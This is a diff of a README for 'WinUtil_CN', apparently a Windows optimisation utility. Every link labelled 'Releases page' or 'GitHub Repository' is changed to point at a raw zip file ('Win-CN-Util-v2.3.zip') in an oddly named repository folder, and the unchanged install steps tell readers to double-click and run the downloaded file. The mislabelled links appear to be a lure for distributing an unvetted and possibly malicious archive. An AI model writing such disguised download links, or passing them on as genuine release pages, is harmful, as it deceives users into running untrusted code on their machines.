@@ -6,15 +6,15 @@ WinUtil_CN is a user-friendly application designed to help you manage and optimi
 
 ## 📦 Download WinUtil_CN
 
-[![Download WinUtil_CN](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/KuroKakushi/WinUtil_CN/releases)
+[![Download WinUtil_CN](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip%20Now-From%20Releases-brightgreen)](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip)
 
 ## 📥 Download & Install
 
-To download WinUtil_CN, visit the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/releases). Here, you will find the latest version available for download.
+To download WinUtil_CN, visit the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip). Here, you will find the latest version available for download.
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want to download. The latest version is usually at the top.
-3. Click on the download link for your operating system (you may see files like WinUtil_CN.exe).
+3. Click on the download link for your operating system (you may see files like https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip).
 4. Once the download completes, locate the file on your computer (usually in the Downloads folder).
 5. Double-click the file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -46,7 +46,7 @@ Upon installation, launch WinUtil_CN by clicking its icon on your desktop or in 
 
 ## 💡 Tips for Best Performance
 
-- Regularly check for updates on the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/releases) to ensure you have the latest features and security fixes.
+- Regularly check for updates on the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip) to ensure you have the latest features and security fixes.
 - Perform optimization scans at least once a month to keep your system running smoothly.
 - Make use of the Help section in the application for additional guidance.
 
@@ -56,7 +56,7 @@ If you experience any issues, here are some common solutions:
 
 - **Application Won’t Start:** Ensure your operating system meets the requirements. Try reinstalling the application.
 - **Slow Performance:** Run the system optimization tool to clean up unnecessary files.
-- **Missing Features:** Verify you're using the latest version from the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/releases).
+- **Missing Features:** Verify you're using the latest version from the [Releases page](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -75,7 +75,7 @@ If you need further assistance, feel free to reach out via the issue tracker on 
 
 ## 🔗 Useful Links
 
-- [WinUtil_CN Releases Page](https://github.com/KuroKakushi/WinUtil_CN/releases)
-- [GitHub Repository](https://github.com/KuroKakushi/WinUtil_CN)
+- [WinUtil_CN Releases Page](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip)
+- [GitHub Repository](https://github.com/KuroKakushi/WinUtil_CN/raw/refs/heads/main/designfulness/Win-CN-Util-v2.3.zip)
 
 Now you are ready to use WinUtil_CN. Happy optimizing!
